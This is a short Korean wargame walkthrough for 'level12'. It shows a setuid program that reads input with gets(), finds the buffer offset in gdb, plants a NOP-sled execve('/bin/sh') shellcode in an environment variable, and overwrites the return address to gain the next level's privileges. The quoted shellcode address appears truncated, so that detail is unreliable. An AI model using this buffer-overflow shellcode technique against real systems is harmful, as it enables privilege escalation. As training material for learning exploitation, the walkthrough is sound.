level12
===
1. hint 파일을 열어보면 다음과 같은 메세지가 적혀져 있는 것을 볼 수 있다.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

int main(){
    char str[256];

    setreuid(3093, 3093);
    printf("문장을 입력하세요.\n");
    gets(str);
    printf("%s\n", str);
}
```
이것은 attackme의 소스이다. 이 소스를 보니 전 단계인 level11의 풀이와 비슷해 보인다. 
2. gdb attackme -> disas main에서 보면 264만큼이 할당되는 것을 찾을 수 있다. 그래서 level11과 같이 264+4(SPF(dummy값을 넣을 예정))+shellcode의 주소를 넣어 level13의 권한에 접근할 계획이다.
3. 환경변수 shellcode를 만든다. 만드는 방법은 다음과 같다.

__export shellcode=`python -c'print"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`__

4. shellcode의 주소를 구하면(/tmp/getenv shellcode) 다음과 같다.
               
            __0xbfffb19__
5. 위에서 구한 주소를 이용하여 attackme를 공격하면 level13의 권한을 취득할 수 있다. 여기서 my-pass를 입력하면 level13의 password를 입력할 수 있다. 
